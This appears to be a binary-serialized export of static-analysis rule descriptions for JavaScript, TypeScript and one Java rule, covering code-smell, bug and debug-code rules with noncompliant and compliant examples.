javascriptWithStatement$"with" statements should not be used"MINOR*js:£<p>The use of the <code>with</code> keyword produces an error in JavaScript strict mode code. However, that's not the worst that can be said against
<code>with</code>.</p>
<p>Using <code>with</code> allows a short-hand access to an object's properties - assuming they're already set. But use <code>with</code> to access
some property not already set in the object, and suddenly you're catapulted out of the object scope and into the global scope, creating or overwriting
variables there. Since the effects of <code>with</code> are entirely dependent on the object passed to it, <code>with</code> can be dangerously
unpredictable, and should never be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var x = 'a';

var foo = {
  y: 1
}

with (foo) {  // Noncompliant
  y = 4;  // updates foo.x
  x = 3;  // does NOT add a foo.x property; updates x var in outer scope
}
print(foo.x + " " + x); // shows: undefined 3
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = 'a';

var foo = {
  y: 1
}

foo.y = 4;
foo.x = 3;

print(foo.x + " " + x); // shows: 3 a
</pre>ZBUG
Ç
javascript:S1442Ì

javascriptS1442"alert(...)" should not be used"MINOR*js:ú<p><code>alert(...)</code> as well as <code>confirm(...)</code> and <code>prompt(...)</code> can be useful for debugging during development, but in
production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(unexpectedCondition) {
  alert("Unexpected Condition");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>ZVULNERABILITY
Ö
javascript:S3863

javascriptS3863.Imports from the same modules should be merged"MINOR*js:ì<p>Multiple imports from the same module should be merged together to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import { B1 } from 'b';
import { B2 } from 'b'; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
import { B1, B2 } from 'b';
</pre>Z
CODE_SMELL
Á
javascript:S1441“

javascriptS14416Quotes for string literals should be used consistently"MINOR*js:Ì<p>This rule checks that all string literals use the same kind of quotes.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the parameter default (forcing single quotes):</p>
<pre>
var firstParameter = "something"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var firstParameter = 'something';
</pre>
<h2>Exceptions</h2>
<p>Strings that contain quotes are ignored.</p>
<pre>
let heSaid = "Then he said 'What?'."  // ignored
let sheSaid = '"Whatever!" she replied.'  // ignored
</pre>Z
CODE_SMELL
ú
javascript:S4158á

javascriptS41584Empty collections should not be accessed or iterated"MINOR*js:´<p>When a collection is empty it makes no sense to access or iterate it. Doing so anyway is surely an error; either population was accidentally
omitted or the developer doesn't understand the situation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let strings = [];

if (strings.includes("foo")) {}  // Noncompliant

for (str of strings) {}  // Noncompliant

strings.forEach(str =&gt; doSomething(str)); // Noncompliant

</pre>ZBUG
‰
javascript:TrailingWhitespace¬

javascriptTrailingWhitespace.Lines should not end with trailing whitespaces"MINOR*js:ÿ<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// The following string will error if there is a whitespace after '\'
var str = "Hello \
World";
</pre>Z
CODE_SMELL
ƒ
javascript:S3626Ø

javascriptS3626'Jump statements should not be redundant"MINOR*js:Ÿ<p>Jump statements, such as <code>return</code>, <code>break</code> and <code>continue</code> let you change the default flow of program execution,
but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function redundantJump(x) {
  if (x == 1) {
    console.log("x == 1");
    return; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function redundantJump(x) {
  if (x == 1) {
    console.log("x == 1");
  }
}
</pre>
<h2>Exceptions</h2>
<p><code>break</code> and <code>return</code> inside <code>switch</code> statement are ignored, because they are often used for consistency.
<code>continue</code> with label is also ignored, because label is usually used for clarity. Also a jump statement being a single statement in a block
is ignored.</p>Z
CODE_SMELL
·
typescript:S1533Ã

typescriptS15336Wrapper objects should not be used for primitive types"MINOR*ts:Á<p>The use of wrapper objects for primitive types is gratuitous, confusing and dangerous. If you use a wrapper object constructor for type conversion,
just remove the <code>new</code> keyword, and you'll get a primitive value automatically. If you use a wrapper object as a way to add properties to a
primitive, you should re-think the design. Such uses are considered bad practice, and should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = new Number("0");
if (x) {
  alert('hi');  // Shows 'hi'.
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = Number("0");
if (x) {
  alert('hi');
}
</pre>Z
CODE_SMELL
£
typescript:S105è

typescriptS105(Tabulation characters should not be used"MINOR*ts:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
˜
typescript:S4138‚

typescriptS4138&"for of" should be used with Iterables"MINOR*ts:ç<p>If you have an iterable, such as an array, set, or list, your best option for looping through its values is the <code>for of</code> syntax. Use a
counter, and ... well you'll get the right behavior, but your code just isn't as clean or clear.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const arr = [4, 3, 2, 1];

for (let i = 0; i &lt; arr.length; i++) {  // Noncompliant
  console.log(arr[i]);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
const arr = [4, 3, 2, 1];

for (let value of arr) {
  console.log(value);
}
</pre>Z
CODE_SMELL
 
typescript:S1301µ

typescriptS13019"switch" statements should have at least 3 "case" clauses"MINOR*ts:Õ<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>Z
CODE_SMELL
”
typescript:S1940æ

typescriptS1940%Boolean checks should not be inverted"MINOR*ts:Í<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!(a === 2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a !== 2) { ... }
</pre>Z
CODE_SMELL
Ù
typescript:S4137ﬂ

typescriptS4137Type assertions should use "as""MINOR*ts:ë<p>Type assertion can be done in two ways: with <code>as MyType</code> or with <code>&lt;MyType&gt;</code>. But since there is an ambiguity in the
latter when using JSX and there is no ambiguity in the former, <code>as</code> is preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var foo = &lt;any&gt;"foo";  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var foo = "foo" as any;
</pre>Z
CODE_SMELL
Ω
typescript:S1264®

typescriptS12645A "while" loop should be used instead of a "for" loop"MINOR*ts:ƒ<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>Z
CODE_SMELL
Ë
typescript:S4136”

typescriptS4136+Method overloads should be grouped together"MINOR*ts:˘<p>For clarity, all overloads of the same method should be grouped together. That lets both users and maintainers quickly understand all the current
available options.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface MyInterface {
  doTheThing(): number;
  doTheOtherThing(): string;
  doTheThing(str: string): string;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
interface MyInterface {
  doTheThing(): number;
  doTheThing(str: string): string;
  doTheOtherThing(): string;
}
</pre>Z
CODE_SMELL
ç
typescript:S113˘

typescriptS1130Files should contain an empty newline at the end"MINOR*ts:õ<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>Z
CODE_SMELL
Î
typescript:S117◊

typescriptS117MVariable, property and parameter names should comply with a naming convention"MINOR*ts:‹<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule checks that all variable,
property and parameter names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[_$A-Za-z][$A-Za-z0-9]*$|^[_$A-Z][_$A-Z0-9]+$</code>:</p>
<pre>
const foo_bar = 1;
const baz_ = 2;
</pre>
<h2>Compliant Solution</h2>
<pre>
const fooBar = 1;
const _baz = 2;
</pre>Z
CODE_SMELL
«
typescript:S1874≤

typescriptS1874"Deprecated APIs should not be used"MINOR*ts:·<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning
that the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away
from the aging, soon-to-be-retired technology.</p>
<h2>Noncompliant Code Example</h2>
<pre>
export interface LanguageService {
  /**
  * @deprecated Use getEncodedSyntacticClassifications instead.
  */
  getSyntacticClassifications(fileName: string, span: TextSpan): ClassifiedSpan[];
}

const syntacticClassifications = getLanguageService().getSyntacticClassifications(file, span); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KgAVAg">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>
</ul>Z
CODE_SMELL
Á
typescript:S3257“

typescriptS3257LPrimitive types should be omitted from initialized or defaulted declarations"MINOR*ts:◊<p>Unnecessarily verbose declarations and initializations make it harder to read the code, and should be simplified. Specifically, primitive
(<code>number</code>, <code>string</code>, <code>boolean</code> and others) types should be omitted from variable and parameter declaration when they
can be easily inferred from the initialized or defaulted value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const n: number = 1; // Noncompliant, "number" can be omitted

function foo(s: string = "") {} // Noncompliant, "string" can be omitted

class Bar {
  b: boolean = true;  // Noncompliant, "boolean" can be omitted
}
</pre>
<h2>Compliant Solution</h2>
<pre>
const n = 1;

function foo(s = "") {}

class Bar {
  b = true;
}
</pre>Z
CODE_SMELL
´
typescript:S3533ñ

typescriptS35330"import" should be used to include external code"MINOR*ts:∑<p>Before ECMAScript 2015, module management had to be ad-hoc or provided by 3rd-party libraries such as Node.js, Webpack, or RequireJS. Fortunately,
ES2015, provides language-standard mechanisms for module management, <code>import</code> and <code>export</code>, and older usages should be
converted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// circle.js
exports.area = function (r) {
  return PI * r * r;
};

// foo.js
define(["./cart", "./horse"], function(cart, horse) {  // Noncompliant
  // ...
});

// bar.js
const circle = require('./circle.js');  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
// circle.js
let area = function (r) {
  return PI * r * r;
}
export default area;

// foo.js
import cart from "./cart.js";
import horse from "./horse.js";

// bar.js
import circle from "./circle.js"
</pre>Z
CODE_SMELL
‡
typescript:S3498À

typescriptS3498.Object literal shorthand syntax should be used"MINOR*ts:Ó<p>When an already-defined variable is given the same name within a new object, object-shorthand syntax is preferred as being more compact. Similarly,
object-shorthand is also preferred for the definition of functions in object literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let a = 1;

let myObj = {
  a : a,  // Noncompliant
  fun: function () {  // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let a = 1;

let myObj = {
  a,
  fun () {
    //...
  }
}
</pre>Z
CODE_SMELL
Å

typescript:S1516Ï	

typescriptS1516,Multiline string literals should not be used"MINOR*ts:ë	<p>Continuing a string across a linebreak is supported in most script engines, but it is not a part of ECMAScript. Additionally, the whitespace at the
beginning of each line can't be safely stripped at compile time, and any whitespace after the slash will result in tricky errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myString = 'A rather long string of English text, an error message \
                actually that just keeps going and going -- an error \
                message to make the Energizer bunny blush (right through \
                those Schwarzenegger shades)! Where was I? Oh yes, \
                you\'ve got an error and all the extraneous whitespace is \
                just gravy.  Have a nice day.';  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var myString = 'A rather long string of English text, an error message ' +
    'actually that just keeps going and going -- an error ' +
    'message to make the Energizer bunny blush (right through ' +
    'those Schwarzenegger shades)! Where was I? Oh yes, ' +
    'you\'ve got an error and all the extraneous whitespace is ' +
    'just gravy.  Have a nice day.';
</pre>Z
CODE_SMELL
è
typescript:S2966˙

typescriptS2966&Non-null assertions should not be used"MINOR*ts:•<p>The point of declaring an optional property or parameter is to make explicit the fact that it might contain no valid value, i.e. <code>null</code>
or <code>undefined</code>. Using a non-null assertion (the <code>!.</code> operator) will lead to a runtime error if the optional does contain
<code>null</code> or <code>undefined</code>. Even if the value is tested first, it's still considered a bad practice to use a non-null assertion. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function doTheThing(foo?: Foo) {
  let s = foo!.bar;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doTheThing(foo?: Foo) {
  if (foo) {
    let s = foo.bar;
  }
}
</pre>Z
CODE_SMELL
¥	
typescript:S1116ü	

typescriptS1116"Extra semicolons should be removed"MINOR*ts:Œ<p>Extra semicolons (<code>;</code>) are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
  <li> There was a misunderstanding about where semicolons are required or useful. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var x = 1;; // Noncompliant

function foo() {
};  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = 1;

function foo() {
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL
‹
typescript:S1125«

typescriptS11252Boolean literals should not be used in comparisons"MINOR*ts:Ê<p>Boolean literals should be avoided in comparison expressions <code>==</code> and <code>!=</code> to improve code readability.</p>
<p>This rule also reports on redundant boolean operations.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
let someValue = "0";
// ...

if (someValue == true) { /* ... */ }
if (someBooleanValue != true) { /* ... */ }
doSomething(!false);
</pre>
<h2>Compliant Solution</h2>
<pre>
if (someValue &amp;&amp; someValue != "0") { /* ... */ }
if (!someBooleanValue) { /* ... */ }
doSomething(true);
</pre>Z
CODE_SMELL
ÿ
typescript:S1488√

typescriptS1488NLocal variables should not be declared and then immediately returned or thrown"MINOR*ts:∆<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function computeDurationInMilliseconds() {
  var duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}
</pre>Z
CODE_SMELL
Ñ
typescript:S101

typescriptS1012Class names should comply with a naming convention"MINOR*ts:ê<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names (and interfaces for TypeScript) match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>Z
CODE_SMELL
£
typescript:S1525é

typescriptS1525&Debugger statements should not be used"MINOR*ts:∂<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>ZVULNERABILITY
Ω
typescript:S2737®

typescriptS2737+"catch" clauses should do more than rethrow"MINOR*ts:Œ<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  doSomething();
} catch (ex) {  // Noncompliant
  throw ex;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  doSomething();
} catch (ex) {
  console.err(ex);
  throw ex;
}
</pre>
<p>or</p>
<pre>
doSomething();
</pre>Z
CODE_SMELL
ß
typescript:S3512í

typescriptS35128Template strings should be used instead of concatenation"MINOR*ts:´<p>ECMAScript 2015 added the ability to use template literals instead of concatenation. Since their use is clearer and more concise, they are
preferred in environments that support ECMAScript 2015.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function sayHello(name) {
  console.log("hello " + name);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function sayHello(name) {
  console.log(`hello ${name}`);
}
</pre>Z
CODE_SMELL
‘
typescript:S4325ø

typescriptS43259Redundant casts and not-null assertions should be avoided"MINOR*ts:◊<p>The TypeScript compiler automatically casts a variable to the relevant type inside conditionals where it is possible to infer the type (because
<code>typeof</code>, <code>instanceof</code>, etc was used). This compiler feature makes casts and not-<code>null</code> assertions unnecessary.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function getName(x?: string | UserName) {
  if (x) {
    console.log("Getting name for " + x!); // Noncompliant

    if (typeof x === "string")
      return (x as string); // Noncompliant
    else
      return (x as UserName).name; // Noncompliant
  }
  return "NoName";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function getName(x?: string | UserName) {
  if (x) {
    console.log("Getting name for " + x);

    if (typeof x === "string")
      return x;
    else
      return x.name;
  }
  return "NoName";
}
</pre>Z
CODE_SMELL
–
typescript:S4324ª

typescriptS4324%Primitive return types should be used"MINOR*ts:Á<p>The return type <code>any</code> should be avoided because it prevents the type safety checks normally done by the compiler. When a function
returns a primitive type (i.e. number, string or boolean) it is safe to replace <code>any</code> with <code>number</code>, <code>string</code> or
<code>boolean</code> type respectively, or remove the return type completely and let compiler infer it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() : any { // Noncompliant
  return 1;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  return 1;
}
// or
function foo(): number {
  return 1;
}
</pre>Z
CODE_SMELL
ô
typescript:S4326Ñ

typescriptS4326&"await" should not be used redundantly"MINOR*ts:Ø<p>An <code>async</code> function always wraps the return value in a <code>Promise</code>. Using <code>return await</code> is therefore redundant.</p>
<h2>Noncompliant Code Example</h2>
<pre>
async function foo() {
  // ...
}

async function bar() {
  // ...
  return await foo(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
async function foo() {
  // ...
}

async function bar() {
  // ...
  return foo();
}
</pre>Z
CODE_SMELL
«
typescript:S4323≤

typescriptS4323Type aliases should be used"MINOR*ts:Ë<p>Union and intersection types are convenient but can make code harder to read and maintain. So if a particular union or intersection is used in
multiple places, the use of a type alias is recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(x:string|null|number) { // Noncompliant
  // ...
}
function bar(x:string|null|number) {
  // ...
}
function zoo(): string|null|number {
  return null;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
type MyType = string | null | number;

function foo(x: MyType) {
  // ...
}
function bar(x: MyType) {
  // ...
}
function zoo(): MyType {
  return null;
}
</pre>Z
CODE_SMELL
≠
typescript:S4322ò

typescriptS4322Type guards should be used"MINOR*ts:œ
<p>A common idiom in JavaScript to differentiate between two possible types is to check for the presence in the object of a member of the desired
type. Usually, to simplify the code, a boolean function is created to check the type.</p>
<p>Typescript provides user defined type guard functions. These are just functions with a return type of <code>argumentName is SomeType</code>. Such
functions return <code>true</code> if the argument is of the specified type. One of the advantages of using such a function is that in a conditional
block where the condition is a type guard, the compiler automatically performs the appropriate casts, so explicit casting becomes unnecessary.</p>
<p>This rule raises an issue when a boolean function checking for the type of its only argument can be replaced with a user-defined type guard
function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function isSomething(x: BaseType) : boolean { // Noncompliant
  return (&lt;Something&gt;x).foo !== undefined;
}

if (isSomething(v)) {
  (&lt;Something&gt;v).foo();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function isSomething(x: BaseType) : x is Something {
  return (&lt;Something&gt;x).foo !== undefined;
}

if (isSomething(v)) {
  v.foo();
}
</pre>
<h2>See</h2>
<p><a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">TypeScript advanced types</a></p>Z
CODE_SMELL
≈
typescript:S3402∞

typescriptS3402+Strings and non-strings should not be added"MINOR*ts:÷<p>Use a <code>+</code> with two numbers and you'll get addition. But use it with a string and anything else, and you'll get concatenation. This could
be confusing, especially if it's not obvious that one of the operands is a string. It is recommended to explicitly convert the non-string component to
make it easier to understand to future maintainers.</p>
<p>This rule raises an issue when <code>+</code> is used with a string and a non-string.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  let x = 5 + 8;  // okay
  let z = "8"
  return x + z;  // Noncompliant; yields string "138"
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  let x = 5 + 8;
  let z = "8"
  return x + Number(z);
}
</pre>Z
CODE_SMELL
Ê
typescript:S1105—

typescriptS1105:An open curly brace should be located at the end of a line"MINOR*ts:Ë
<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the brace-style is not respecting the convention
setup in parameter:</p>
<p> * <a href="https://en.wikipedia.org/wiki/Indentation_style#K&amp;R_style">1tbs</a> (default)</p>
<p> * <a href="https://en.wikipedia.org/wiki/Indentation_style#Allman_style">allman</a></p>
<p> * <a href="https://en.wikipedia.org/wiki/Indentation_style#Variant:_Stroustrup">stroustrup</a></p>
<h2>Noncompliant Code Example</h2>
<p>Using the parameter default (1tbs):</p>
<pre>
if (condition)
{                                                      //Noncompliant
  doSomething();
}                                                      //Noncompliant
else {
  doSomethingElse();
}{code}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {                                   //Compliant
  doSomething();
} else {                                           //Compliant
  doSomethingElse();
}
</pre>
<h2>Exceptions</h2>
<p> * Object literals appearing as arguments can start on their own line.</p>
<pre>
functionWithObject(
   {                                                 //Compliant
        g: "someValue"
   }
);
</pre>
<p> * When blocks are inlined (left and right curly braces on the same line), no issue is triggered.</p>
<pre>
if(condition) {doSomething();}                       //Compliant
</pre>Z
CODE_SMELL
é
typescript:S1226˘

typescriptS1226bFunction parameters, caught exceptions and foreach variables' initial values should not be ignored"MINOR*ts:Ô<p>While it is technically correct to assign to parameters from within function bodies, it reduces code readability because developers won't be able
to tell whether the original parameter or some temporary variable is being accessed without going through the whole function. Moreover, some
developers might also expect assignments of function parameters to be visible to callers, which is not the case, and this lack of visibility could
confuse them. Instead, all parameters, caught exceptions, and foreach parameters should be treated as constants.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function MyClass(name, strings) {
  name = foo;                    // Noncompliant

  for (var str of strings) {
    str = "";  // Noncompliant
  }
}
</pre>ZBUG
Û
typescript:S4023ﬁ

typescriptS4023Interfaces should not be empty"MINOR*ts:ë<p>An empty interface is equivalent to an empty object ('{}'). Normally you cannot directly assign an object literal to a type when the object literal
contains more properties than are specified in the type. But in the case of an empty interface, this check is not done, and such assignments will be
successful. The result is highly likely to confuse maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface MyFace {}  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
interface MyFace {
  foo: number;
}
</pre>Z
CODE_SMELL
ú
typescript:S1438á

typescriptS1438%Statements should end with semicolons"MINOR*ts:≥<p>In JavaScript, the semicolon (<code>;</code>) is optional as a statement separator, but omitting semicolons can be confusing, and lead to
unexpected results because a semicolon is implicitly inserted at the end of each line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun() {
  return  // Noncompliant. ';' implicitly inserted at end of line
       5   // Noncompliant. ';' implicitly inserted at end of line
}
print(fun());  // prints "undefined", not "5"
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun() {
  return 5;
}
print(fun());
</pre>Z
CODE_SMELL
Ö
typescript:S3863

typescriptS3863.Imports from the same modules should be merged"MINOR*ts:ì<p>Multiple imports from the same module should be merged together to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import { B1 } from 'b';
import { B2 } from 'b'; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
import { B1, B2 } from 'b';
</pre>Z
CODE_SMELL
Á
typescript:S1441“

typescriptS14416Quotes for string literals should be used consistently"MINOR*ts:Ì<p>This rule checks that all string literals use the same kind of quotes.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the parameter default (forcing single quotes):</p>
<pre>
var firstParameter = "something"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var firstParameter = 'something';
</pre>
<h2>Exceptions</h2>
<p>Strings that contain quotes are ignored.</p>
<pre>
let heSaid = "Then he said 'What?'."  // ignored
let sheSaid = '"Whatever!" she replied.'  // ignored
</pre>Z
CODE_SMELL
¶
typescript:S4156ë

typescriptS4156"module" should not be used"MINOR*ts:«<p>Each file is considered an "external" module. The use of the <code>module</code> keyword creates an internal module, and was used before the
ECMAScript 2015 addition of <code>namespace</code>s for the same purpose. Now that <code>namespace</code> is available, the use of <code>module</code>
is deprecated because it does the same thing, and its use could confuse maintainers unaware of the history of the language.</p>
<h2>Noncompliant Code Example</h2>
<pre>
module myMod {  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace myMod {
  // ...
}
</pre>Z
CODE_SMELL
á
typescript:S4157Ú

typescriptS4157)Default type parameters should be omitted"MINOR*ts:ö<p>There's no reason to repeat a default type unless it is early in a list and other, non-default types come after it. Instead, leave it out and only
supply type when it is something other than the default.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo&lt;N = number, S = string&gt;() {}
foo&lt;number, string&gt;();  // Noncompliant; both types redundant
foo&lt;string, string&gt;();  // Noncompliant; 2nd string is redundant
foo&lt;number, number&gt;();  // Ignored; number is redundant but required
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo&lt;N = number, S = string&gt;() {}
foo();
foo&lt;string&gt;();
foo&lt;number, number&gt;();
</pre>Z
CODE_SMELL
ú
typescript:S4158á

typescriptS41584Empty collections should not be accessed or iterated"MINOR*ts:´<p>When a collection is empty it makes no sense to access or iterate it. Doing so anyway is surely an error; either population was accidentally
omitted or the developer doesn't understand the situation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let strings = [];

if (strings.includes("foo")) {}  // Noncompliant

for (str of strings) {}  // Noncompliant

strings.forEach(str =&gt; doSomething(str)); // Noncompliant

</pre>ZBUG
ƒ
typescript:S3626Ø

typescriptS3626'Jump statements should not be redundant"MINOR*ts:Ÿ<p>Jump statements, such as <code>return</code>, <code>break</code> and <code>continue</code> let you change the default flow of program execution,
but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function redundantJump(x) {
  if (x == 1) {
    console.log("x == 1");
    return; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function redundantJump(x) {
  if (x == 1) {
    console.log("x == 1");
  }
}
</pre>
<h2>Exceptions</h2>
<p><code>break</code> and <code>return</code> inside <code>switch</code> statement are ignored, because they are often used for consistency.
<code>continue</code> with label is also ignored, because label is usually used for clarity. Also a jump statement being a single statement in a block
is ignored.</p>Z
CODE_SMELL
‘

java:S2221≈
javaS2221D"Exception" should not be caught when not required by called methods"MINOR*java:÷
<p>Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception types,
both checked and runtime exceptions, thereby casting too broad a net. Indeed, was it really the intention of developers to also catch runtime
exceptions? To prevent any misunderstanding, if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed
in the <code>catch</code> clause.</p>
